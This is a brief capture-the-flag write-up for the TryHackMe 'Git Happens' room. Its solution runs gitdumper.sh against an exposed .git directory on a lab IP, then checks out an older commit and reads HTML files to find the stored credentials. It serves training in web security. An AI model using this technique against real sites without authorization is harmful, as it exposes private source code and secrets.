---
description: https://tryhackme.com/room/githappens
---

# Git Happens

## :writing\_hand: Solution

```bash
./gitdumper.sh http://10.10.54.98/.git/ git
cd git/
git log
git checkout 395e087334d613d5e423cdf8f7be27196a360459
cat index.html
cat dashboard.html
```

![](<../../.gitbook/assets/Screenshot from 2020-09-28 14-00-11.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-28 14-00-16.png>)

## :link: Support Material

{% embed url="https://github.com/internetwache/GitTools" %}

